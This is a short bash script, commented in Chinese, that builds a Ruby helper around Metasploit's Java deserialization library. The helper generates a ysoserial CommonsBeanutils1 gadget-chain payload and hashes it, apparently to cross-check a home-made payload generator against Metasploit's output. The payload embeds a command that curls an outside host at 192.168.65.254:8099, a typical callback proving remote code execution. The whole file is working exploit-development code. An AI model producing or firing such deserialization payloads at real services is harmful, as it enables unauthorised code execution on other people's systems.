#!/bin/bash
# 交叉验证：msf 官方实现 vs 自实现模板（对比明文序列化体 sha256）
cd /usr/share/metasploit-framework || exit 1
cat > /tmp/t7-msf-check.rb <<'RB'
$LOAD_PATH.unshift '/usr/share/metasploit-framework/lib'
require 'msf/util/java_deserialization'
require 'digest'
b = Msf::Util::JavaDeserialization.ysoserial_payload("CommonsBeanutils1", "curl -s http://192.168.65.254:8099/x1", modified_type: "bash")
puts "MSF_SHA=#{Digest::SHA256.hexdigest(b)} LEN=#{b.length} MAGIC=#{b[0,4].unpack1('h*')}"
RB
timeout 180 bundle exec ruby /tmp/t7-msf-check.rb 2>&1 | tail -6
echo "=== DONE ==="
